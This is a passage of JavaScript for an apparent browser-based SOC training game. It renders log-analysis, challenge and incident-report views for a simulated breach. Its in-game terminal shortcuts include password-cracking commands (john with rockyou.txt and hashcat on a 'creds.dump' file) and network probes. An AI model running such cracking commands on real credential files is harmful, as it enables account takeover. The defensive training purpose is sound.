                 <strong>Implant Process:</strong> <code style="color:#fff">${sc.hiddenSvc.process}</code><br>
                 <strong>Lateral Target:</strong> <span style="color:#34d399">${sc.pivot.pivotNode} (${sc.pivot.pivotIp})</span><br>
                 <strong>Pivot Method:</strong> ${sc.pivot.lateralMethod}</p>
              <span class="zh-badge-cat">KILL CHAIN</span>
            </div>
            <div class="zh-challenge-card">
              <h4>4. Exfiltration & Dumped Hashes</h4>
              <p><strong>Leaked Account:</strong> <code>${sc.cred.user}</code> (${sc.cred.algo})<br>
                 <strong>Raw Hash:</strong> <code style="word-break:break-all;color:#94b8d7">${sc.cred.hash}</code><br>
                 <strong>Target Asset:</strong> <span style="color:#fbbf24;font-family:monospace">${sc.pivot.targetAsset}</span><br>
                 <strong>Capture Flag:</strong> <span style="color:#34d399;font-family:monospace">${sc.flagCode}</span></p>
              <span class="zh-badge-cat">CRYPTO & EXFIL</span>
            </div>
          </div>
        </div>
      `;
      mount.querySelector("#zh-intel-run-tls").onclick = () => {
        runTerminalCommand("openssl s_client -connect " + sc.actor.ip + ":443");
        switchNavigation("OVERVIEW");
      };
      return;
    }

    if (nav === "LOGS") {
      mount.innerHTML = `
        <div class="zh-panel" style="padding:18px;">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;flex-wrap:wrap;gap:10px;">
            <div>
              <h3 style="color:var(--zh-cyan);font-family:var(--zh-font-display);margin:0;">SIEM FORENSIC LOG & PACKET ANALYZER</h3>
              <p style="color:var(--zh-text-Sub);font-size:12px;margin:2px 0 0;">Click any suspicious log row to flag it as forensic evidence and automatically verify relevant objectives.</p>
            </div>
            <button class="zh-btn-primary" id="zh-logs-back">Return to Command Center</button>
          </div>
          <div style="overflow-x:auto;">
            <table class="zh-log-table">
              <thead>
                <tr>
                  <th>ID</th>
                  <th>Timestamp</th>
                  <th>Source IP</th>
                  <th>Dest IP</th>
                  <th>Proto</th>
                  <th>Request / Payload</th>
                  <th>Forensic Analysis</th>
                </tr>
              </thead>
              <tbody>
                ${sc.logs.map(l => `
                  <tr class="${l.suspicious ? "suspicious" : ""} ${state.flaggedLogs[l.id] ? "flagged" : ""}" data-logid="${l.id}">
                    <td>${l.id}</td>
                    <td>${l.time}</td>
                    <td style="color:${l.src === sc.actor.ip ? "#ff6b8b;font-weight:700" : "#e2f1ff"}">${l.src}</td>
                    <td>${l.dst}</td>
                    <td>${l.proto}</td>
                    <td><code>${escapeHtml(l.method)} ${escapeHtml(l.uri)}</code></td>
                    <td>${escapeHtml(l.note)}</td>
                  </tr>
                `).join("")}
              </tbody>
            </table>
          </div>
        </div>
      `;
      mount.querySelector("#zh-logs-back").onclick = () => switchNavigation("OVERVIEW");
      mount.querySelectorAll("tbody tr").forEach(tr => {
        tr.onclick = () => {
          if (window.getSelection && window.getSelection().toString().trim().length > 0) return;
          const lid = tr.getAttribute("data-logid");
          state.flaggedLogs[lid] = !state.flaggedLogs[lid];
          SoundFX.play("scan");
          if (lid === "L-04" || lid === "L-05") solveChallenge("c1", "Flagged exploit log " + lid);
          if (lid === "L-06") solveChallenge("c2", "Flagged reverse shell socket log L-06");
          if (lid === "L-08") solveChallenge("c3", "Flagged lateral SSH pivot log L-08");
          if (lid === "L-09") solveChallenge("c5", "Flagged DNS exfiltration log L-09");
          saveState();
          renderSubViews();
        };
      });
      return;
    }

    if (nav === "CHALLENGES" || nav === "ACHIEVEMENTS") {
      mount.innerHTML = `
        <div class="zh-panel" style="padding:18px;">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;flex-wrap:wrap;gap:10px;">
            <div>
              <h3 style="color:var(--zh-cyan);font-family:var(--zh-font-display);margin:0;">ALL 8 OPERATION OBJECTIVES & INCIDENT REPORT</h3>
              <p style="color:var(--zh-text-Sub);font-size:12px;margin:2px 0 0;">Click any challenge card to inspect hints or submit your forensic findings.</p>
            </div>
            <div style="display:flex;gap:8px;">
              <button class="zh-btn-primary" id="zh-open-report-btn">File Final Incident Report</button>
              <button class="zh-icon-btn" id="zh-chal-back">Back to Overview</button>
            </div>
          </div>
          <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(290px,1fr));gap:12px;">
            ${sc.challenges.map(ch => `
              <div class="zh-challenge-card ${ch.solved ? "solved" : ""}" data-cid="${ch.id}">
                <div>
                  <h4>
                    <span>${ch.num}. ${ch.title}</span>
                    <span style="color:${ch.solved ? "#34d399" : "#fbbf24"};font-size:11px;">${ch.solved ? "✓ SOLVED" : "OPEN"}</span>
                  </h4>
                  <p>${ch.desc}</p>
                  ${ch.solved ? `<div style="font-family:var(--zh-font-mono);font-size:11px;color:#34d399;margin-bottom:8px;">Verified: ${escapeHtml(ch.displayAnswer)}</div>` : ""}
                </div>
                <div class="zh-challenge-meta">
                  <span class="zh-badge-cat">${ch.category}</span>
                  <span class="zh-xp-tag">★ ${ch.xp} XP</span>
                </div>
              </div>
            `).join("")}
          </div>
        </div>
      `;
      mount.querySelector("#zh-open-report-btn").onclick = () => openIncidentReportModal();
      mount.querySelector("#zh-chal-back").onclick = () => switchNavigation("OVERVIEW");
      mount.querySelectorAll(".zh-challenge-card").forEach(c => {
        c.onclick = () => {
          if (window.getSelection && window.getSelection().toString().trim().length > 0) return;
          openChallengeModal(c.getAttribute("data-cid"));
        };
      });
      return;
    }

    if (nav === "NETWORK" || nav === "TERMINAL" || nav === "SETTINGS") {
      mount.innerHTML = `
        <div class="zh-panel" style="padding:18px;">
          <h3 style="color:var(--zh-cyan);font-family:var(--zh-font-display);margin:0 0 12px;">COMMAND CENTER SETTINGS & COOKIE SAVE DATA</h3>
          <p style="color:var(--zh-text-Sub);margin-bottom:16px;">Your High Score, Career XP, unlocked Achievements, active operation seed, firewall states, and command history are automatically stored in browser cookies (<code>${COOKIE_NAME}</code>).</p>
          <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px;margin-bottom:18px;">
            <div class="zh-challenge-card" style="min-height:auto;">
              <h4>🏆 High Score</h4>
              <div style="font-family:var(--zh-font-mono);font-size:20px;font-weight:800;color:#fbbf24;">${state.highScore} XP</div>
              <span style="font-size:11px;color:var(--zh-text-Sub);">Best Operation Score</span>
            </div>
            <div class="zh-challenge-card" style="min-height:auto;">
              <h4>★ Career Total XP</h4>
              <div style="font-family:var(--zh-font-mono);font-size:20px;font-weight:800;color:var(--zh-cyan-bright);">${state.lifetimeXp} XP</div>
              <span style="font-size:11px;color:var(--zh-text-Sub);">Cumulative Across All Breaches</span>
            </div>
            <div class="zh-challenge-card" style="min-height:auto;">
              <h4>✓ Operations Cleared</h4>
              <div style="font-family:var(--zh-font-mono);font-size:20px;font-weight:800;color:#34d399;">${state.opsCompleted}</div>
              <span style="font-size:11px;color:var(--zh-text-Sub);">Signed Incident Reports</span>
            </div>
          </div>
          <div style="display:flex;flex-wrap:wrap;gap:12px;margin-bottom:10px;">
            <button class="zh-btn-primary" id="zh-set-reroll">Generate New Procedural Operation</button>
            <button class="zh-icon-btn" id="zh-set-sfx">Audio SFX: ${SoundFX.enabled ? "ON" : "OFF"}</button>
            <button class="zh-icon-btn" id="zh-set-scanlines">CRT Scanlines: ${state.scanlines ? "ON" : "OFF"}</button>
            <button class="zh-icon-btn" id="zh-set-reset-cookie" style="border-color:rgba(255,42,95,0.5);color:#ff8da3;">Reset Saved Cookie & Career Data</button>
            <button class="zh-icon-btn" id="zh-set-back">Return to Overview</button>
          </div>
        </div>
      `;
      mount.querySelector("#zh-set-reroll").onclick = () => {
        startNewOperation();
        switchNavigation("OVERVIEW");
      };
      mount.querySelector("#zh-set-sfx").onclick = () => {
        SoundFX.enabled = !SoundFX.enabled;
        saveState();
        renderSubViews();
      };
      mount.querySelector("#zh-set-scanlines").onclick = () => {
        state.scanlines = !state.scanlines;
        const app = document.getElementById("zero-hour-app");
        if (app) app.classList.toggle("zh-scanlines", state.scanlines);
        saveState();
        renderSubViews();
      };
      mount.querySelector("#zh-set-reset-cookie").onclick = () => {
        writeCookie(COOKIE_NAME, {}, 0);
        try { localStorage.removeItem(STORAGE_KEY); } catch (e) {}
        state.highScore = 0;
        state.lifetimeXp = 0;
        state.opsCompleted = 0;
        state.cmdHistory = [];
        state.achievements = {
          first_blood: false,
          log_analyzer: false,
          network_detective: false,
          crypto_breaker: false,
          full_compromise: false
        };
        startNewOperation();
        showToast("Cookie & Career Data Reset");
        renderSubViews();
      };
      mount.querySelector("#zh-set-back").onclick = () => switchNavigation("OVERVIEW");
    }
  }

  // =========================================================================
  // 9. INTERACTIVE CHALLENGE SOLVER & FINAL INCIDENT REPORT MODALS
  // =========================================================================
  function openChallengeModal(challengeId) {
    const sc = state.scenario;
    const ch = sc.challenges.find(c => c.id === challengeId) || sc.challenges[0];
    if (ch.id === "c8") {
      openIncidentReportModal();
      return;
    }

    const backdrop = document.getElementById("zh-modal-backdrop");
    const box = document.getElementById("zh-modal-box");
    if (!backdrop || !box) return;

    box.innerHTML = `
      <div class="zh-panel-header">
        <div class="zh-panel-title">OBJECTIVE #${ch.num} // ${escapeHtml(ch.title)} (${ch.category})</div>
        <button class="zh-icon-btn" id="zh-modal-close">✕</button>
      </div>
      <div style="padding:18px;">
        <p style="color:var(--zh-text);font-size:13px;margin:0 0 12px;">${escapeHtml(ch.desc)}</p>
        <div style="background:rgba(0,229,255,0.07);border-left:3px solid var(--zh-cyan);padding:10px 12px;margin-bottom:14px;font-size:12px;color:var(--zh-text-Sub);">
          <strong style="color:var(--zh-cyan-bright);">Tactical Hint:</strong> ${escapeHtml(ch.hint)}
        </div>
        <label style="display:block;font-family:var(--zh-font-mono);font-size:11.5px;color:var(--zh-cyan-bright);margin-bottom:6px;">
          ${escapeHtml(ch.question)}
        </label>
        <div style="display:flex;gap:8px;margin-bottom:12px;">
          <input type="text" class="zh-input" id="zh-modal-answer" placeholder="Type answer or click Auto-Run Forensic Tool below..." value="${ch.solved ? escapeHtml(ch.displayAnswer) : ""}" />
          <button class="zh-btn-primary" id="zh-modal-submit">Verify</button>
        </div>
        <div id="zh-modal-feedback" style="font-family:var(--zh-font-mono);font-size:12px;min-height:20px;margin-bottom:10px;"></div>
        <div style="display:flex;justify-content:space-between;align-items:center;border-top:1px solid rgba(0,229,255,0.15);padding-top:12px;">
          <button class="zh-icon-btn" id="zh-modal-autorun">⚡ Run Forensic Tool in Terminal</button>
          <span class="zh-xp-tag">Reward: ★ ${ch.xp} XP</span>
        </div>
      </div>
    `;

    backdrop.classList.add("open");
    const input = box.querySelector("#zh-modal-answer");
    const feedback = box.querySelector("#zh-modal-feedback");

    box.querySelector("#zh-modal-close").onclick = () => backdrop.classList.remove("open");
    box.querySelector("#zh-modal-submit").onclick = () => {
      const val = input.value.trim().toLowerCase();
      const matched = ch.acceptedAnswers.some(ans => val.includes(ans) || ans.includes(val && val.length >= 3 ? val : "___none___"));
      if (matched) {
        solveChallenge(ch.id, "Verified via Evidence Submission");
        feedback.style.color = "#34d399";
        feedback.textContent = "[✓] Evidence Verified! Objective Complete.";
        setTimeout(() => backdrop.classList.remove("open"), 700);
      } else {
        SoundFX.play("alert");
        feedback.style.color = "#ff6b8b";
        feedback.textContent = "[!] Incorrect finding. Try clicking 'Run Forensic Tool in Terminal' below!";
      }
    };

    box.querySelector("#zh-modal-autorun").onclick = () => {
      backdrop.classList.remove("open");
      switchNavigation("OVERVIEW");
      const cmdMap = {
        c1: "grep suspicious access.log",
        c2: "nmap -sV 10.10.1.0/24",
        c3: "netstat -tulnp",
        c4: "john --wordlist=rockyou.txt /var/backups/creds.dump",
        c5: "wireshark",
        c6: "openssl s_client -connect " + sc.actor.ip + ":443",
        c7: "isolate " + sc.pivot.pivotNode
      };
      runTerminalCommand(cmdMap[ch.id] || "help");
    };
  }

  function openIncidentReportModal() {
    const sc = state.scenario;
    const backdrop = document.getElementById("zh-modal-backdrop");
    const box = document.getElementById("zh-modal-box");
    if (!backdrop || !box) return;

    box.innerHTML = `
      <div class="zh-panel-header">
        <div class="zh-panel-title">FINAL INCIDENT REPORT // ${sc.op.code}: ${escapeHtml(sc.op.title)}</div>
        <button class="zh-icon-btn" id="zh-rep-close">✕</button>
      </div>
      <div style="padding:18px;">
        <p style="color:var(--zh-text-Sub);font-size:12.5px;margin:0 0 14px;">
          Review the reconstructed kill chain for <strong>Operation Seed #${sc.seed}</strong> and sign off on the official SOC Incident Report.
        </p>
        <div style="background:rgba(4,12,26,0.9);border:1px solid rgba(0,229,255,0.28);border-radius:6px;padding:12px;font-family:var(--zh-font-mono);font-size:11.5px;line-height:1.65;margin-bottom:14px;">
          <div><span style="color:var(--zh-cyan)">[THREAT ACTOR]</span>   ${escapeHtml(sc.actor.name)} (${sc.actor.ip} // ${sc.actor.c2Domain})</div>
          <div><span style="color:var(--zh-cyan)">[ENTRY VECTOR]</span>   ${escapeHtml(sc.exploit.name)} on WEB (${sc.webHostIp})</div>
          <div><span style="color:var(--zh-cyan)">[ROGUE IMPLANT]</span>  Port ${sc.hiddenSvc.port}/tcp — ${escapeHtml(sc.hiddenSvc.process)}</div>
          <div><span style="color:var(--zh-cyan)">[LATERAL PIVOT]</span>  ${sc.pivot.pivotNode} (${sc.pivot.pivotIp}) via ${escapeHtml(sc.pivot.lateralMethod)}</div>
          <div><span style="color:var(--zh-cyan)">[CRACKED CRED]</span>   ${sc.cred.user} : <span style="color:#34d399">${escapeHtml(sc.cred.plaintext)}</span></div>
          <div><span style="color:var(--zh-cyan)">[EXFILTRATED]</span>    ${escapeHtml(sc.pivot.targetAsset)} // Flag: <span style="color:#fbbf24">${sc.flagCode}</span></div>
        </div>
        <div style="display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap;">
          <button class="zh-btn-primary" id="zh-rep-submit">Sign & Submit Incident Report (+200 XP)</button>
          <button class="zh-icon-btn" id="zh-rep-new-op">Launch Next Procedural Operation &rarr;</button>
        </div>
      </div>
    `;

    backdrop.classList.add("open");
    box.querySelector("#zh-rep-close").onclick = () => backdrop.classList.remove("open");
    box.querySelector("#zh-rep-submit").onclick = () => {
      solveChallenge("c8", "Incident Report Signed & Filed for Seed #" + sc.seed);
      state.achievements.full_compromise = true;
      renderAll();
    };
    box.querySelector("#zh-rep-new-op").onclick = () => {
      backdrop.classList.remove("open");
      startNewOperation();
    };
  }

  // =========================================================================
  // 10. INITIALIZATION & EVENT BINDINGS
  // =========================================================================
  function initZeroHour() {
    // Wire left navigation buttons
    document.querySelectorAll(".zh-nav-btn").forEach(btn => {
      btn.addEventListener("click", () => {
        const nav = btn.getAttribute("data-nav");
        if (nav) switchNavigation(nav);
      });
    });

    // Wire Terminal Input, Tab Autocomplete & History
    const termInput = document.getElementById("zh-term-input");
    const ZH_COMMANDS = [
      "help", "nmap", "grep", "cat", "ps", "netstat",
      "john", "hashcat", "wireshark", "pcap", "dig",
      "openssl", "whois", "isolate", "report", "reroll", "clear"
    ];
    const ZH_ARGS = [
      "-sV", "10.10.1.0/24", "10.10.2.0/24", "10.10.3.0/24", "10.10.4.0/24",
      "suspicious", "access.log", "/var/backups/creds.dump", "-tulnp",
      "WEB", "DB", "DEV", "ADMIN", "CORE"
    ];
    if (termInput) {
      termInput.addEventListener("keydown", e => {
        if (e.key === "Tab") {
          e.preventDefault();
          const raw = termInput.value;
          const parts = raw.split(/\s+/);
          if (parts.length <= 1 && !raw.endsWith(" ")) {
            const p = (parts[0] || "").toLowerCase();
            const matches = ZH_COMMANDS.filter(c => c.startsWith(p));
            if (matches.length === 1) {
              termInput.value = matches[0] + " ";
            } else if (matches.length > 1) {
              printTerminalLine(matches.join("   "), "color:#94b8d7");
            }
          } else {
            const last = raw.endsWith(" ") ? "" : parts[parts.length - 1];
            const matches = ZH_ARGS.filter(a => a.toLowerCase().startsWith(last.toLowerCase()));
            if (matches.length === 1) {
              const prefix = raw.endsWith(" ") ? parts.filter(Boolean) : parts.slice(0, -1);
              termInput.value = [...prefix, matches[0]].join(" ") + " ";
            } else if (matches.length > 1) {
              printTerminalLine(matches.join("   "), "color:#94b8d7");
            }
          }
        } else if (e.key === "Enter") {
          const val = termInput.value;
          termInput.value = "";
          runTerminalCommand(val);
        } else if (e.key === "ArrowUp") {
          e.preventDefault();
          if (state.cmdIndex > 0) {
            state.cmdIndex--;
            termInput.value = state.cmdHistory[state.cmdIndex] || "";
          }
        } else if (e.key === "ArrowDown") {
          e.preventDefault();
          if (state.cmdIndex < state.cmdHistory.length - 1) {
            state.cmdIndex++;
            termInput.value = state.cmdHistory[state.cmdIndex] || "";
          } else {
            state.cmdIndex = state.cmdHistory.length;
            termInput.value = "";
          }
        }
      });
    }

    // Wire Quick Command Chips
    document.querySelectorAll("[data-quick-cmd]").forEach(chip => {
      chip.addEventListener("click", () => {
        const cmd = chip.getAttribute("data-quick-cmd");
        if (cmd === "DYNAMIC_ISOLATE") {
          runTerminalCommand("isolate " + state.scenario.pivot.pivotNode);
        } else {
          runTerminalCommand(cmd);
        }
      });
    });

    // Wire "YOUR TOOLS" 6-button Launcher Grid
    document.querySelectorAll("[data-tool-launch]").forEach(btn => {
      btn.addEventListener("click", () => {
        const tool = btn.getAttribute("data-tool-launch");
        const sc = state.scenario;
        if (tool === "nmap") runTerminalCommand("nmap -sV " + sc.nodes[state.selectedNodeId].subnet);
        if (tool === "wireshark") runTerminalCommand("wireshark");
        if (tool === "burp") runTerminalCommand("grep suspicious access.log");
        if (tool === "john") runTerminalCommand("john --wordlist=rockyou.txt /var/backups/creds.dump");
        if (tool === "hashcat") runTerminalCommand("hashcat -m 3200 /var/backups/creds.dump");
        if (tool === "openssl") runTerminalCommand("openssl s_client -connect " + sc.actor.ip + ":443");
      });
    });

    // Wire Top Bar Buttons (New Procedural Operation, Cycle Challenges, Fullscreen)
    const rerollBtn = document.getElementById("zh-btn-new-op");
    if (rerollBtn) rerollBtn.onclick = () => startNewOperation();

    const cycleBtn = document.getElementById("zh-btn-cycle-challenges");
    if (cycleBtn) {
      cycleBtn.onclick = () => {
        SoundFX.play("click");
        state.challengePage = (state.challengePage + 1) % 3;
        renderActiveChallenges();
      };
    }

    const reportBtn = document.getElementById("zh-btn-open-report");
    if (reportBtn) reportBtn.onclick = () => openIncidentReportModal();

    const fsBtn = document.getElementById("zh-btn-fullscreen");
    const appEl = document.getElementById("zero-hour-app");

    function syncFullscreenUI() {
      const isNativeFs = !!(
        document.fullscreenElement ||
        document.webkitFullscreenElement ||
        document.msFullscreenElement
      );
      document.body.classList.toggle("zh-fullscreen-mode", isNativeFs);
      if (fsBtn) {
        fsBtn.textContent = isNativeFs ? "✕ Exit Fullscreen" : "⛶ Fullscreen";
      }
    }

    if (fsBtn) {
      fsBtn.onclick = async () => {
        SoundFX.play("click");
        const isNativeFs = !!(
          document.fullscreenElement ||
          document.webkitFullscreenElement ||
          document.msFullscreenElement
        );

        try {
          if (!isNativeFs) {
            const target = appEl || document.documentElement;
            if (target.requestFullscreen) {
              await target.requestFullscreen();
            } else if (target.webkitRequestFullscreen) {
              target.webkitRequestFullscreen();
            } else if (target.msRequestFullscreen) {
              target.msRequestFullscreen();
            } else {
              document.body.classList.toggle("zh-fullscreen-mode");
            }
          } else {
            if (document.exitFullscreen) {
              await document.exitFullscreen();
            } else if (document.webkitExitFullscreen) {
              document.webkitExitFullscreen();
            } else if (document.msExitFullscreen) {
              document.msExitFullscreen();
            } else {
              document.body.classList.remove("zh-fullscreen-mode");
            }
          }
        } catch (err) {
          // Fallback if browser blocks Fullscreen API in restricted iframe
          const fallbackActive = document.body.classList.toggle("zh-fullscreen-mode");
          fsBtn.textContent = fallbackActive ? "✕ Exit Fullscreen" : "⛶ Fullscreen";
        }
      };
    }

    document.addEventListener("fullscreenchange", syncFullscreenUI);
    document.addEventListener("webkitfullscreenchange", syncFullscreenUI);

    // Close modal on backdrop click
    const backdrop = document.getElementById("zh-modal-backdrop");
    if (backdrop) {
      backdrop.addEventListener("click", e => {
        if (e.target === backdrop) backdrop.classList.remove("open");
      });
    }

    // Wire Collapsible Network Overview HUD
    const netHud = document.getElementById("zh-net-hud");
    const netHudHeader = document.getElementById("zh-net-hud-header");
    const netHudToggle = document.getElementById("zh-net-hud-toggle");
    const netHudToggleIcon = document.getElementById("zh-net-hud-toggle-icon");

    function syncNetHudUI() {
      if (!netHud || !netHudToggleIcon) return;
      const isMobile = window.innerWidth <= 900;
      const isExpanded = isMobile
        ? netHud.classList.contains("expanded")
        : !netHud.classList.contains("collapsed");

      if (netHudHeader) netHudHeader.setAttribute("aria-expanded", String(isExpanded));
      if (netHudToggle) netHudToggle.setAttribute("aria-expanded", String(isExpanded));
      netHudToggleIcon.textContent = isExpanded ? "−" : "+";
    }

    function toggleNetHud(e) {
      if (e) {
        e.stopPropagation();
        e.preventDefault();
      }
      if (!netHud) return;
      if (typeof SoundFX !== "undefined" && SoundFX.play) SoundFX.play("click");
      const isMobile = window.innerWidth <= 900;
      if (isMobile) {
        netHud.classList.toggle("expanded");
      } else {
        netHud.classList.toggle("collapsed");
      }
      syncNetHudUI();
    }

    if (netHudHeader) {
      netHudHeader.addEventListener("click", toggleNetHud);
      netHudHeader.addEventListener("keydown", e => {
        if (e.key === "Enter" || e.key === " ") {
          e.preventDefault();
          toggleNetHud(e);
        }
      });
    }

    if (netHudToggle) {
      netHudToggle.addEventListener("click", toggleNetHud);
    }

    // Dismiss expanded mobile HUD when tapping anywhere on the canvas
    const isoViewport = document.getElementById("zh-iso-map-Mount");
    if (isoViewport) {
      isoViewport.addEventListener("click", () => {
        if (window.innerWidth <= 900 && netHud && netHud.classList.contains("expanded")) {
          netHud.classList.remove("expanded");
          syncNetHudUI();
        }
      });
    }

    window.addEventListener("resize", syncNetHudUI);
    syncNetHudUI();

    // Restore saved cookie state if available, otherwise generate a fresh procedural operation
    restoreOrStartOperation();
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", initZeroHour);
  } else {
    initZeroHour();
  }
})();

